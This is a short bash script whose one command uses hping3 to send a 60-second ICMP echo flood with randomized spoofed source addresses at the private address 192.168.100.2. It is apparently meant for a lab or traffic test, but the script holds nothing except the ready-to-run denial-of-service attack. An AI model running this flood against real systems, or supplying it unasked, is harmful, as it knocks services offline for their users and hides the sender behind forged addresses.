#!/bin/bash

# Hping3 ICMP Echo Flood (60 seconds)
sudo timeout 60 hping3 -1 192.168.100.2 --rand-source -d 0 --flood
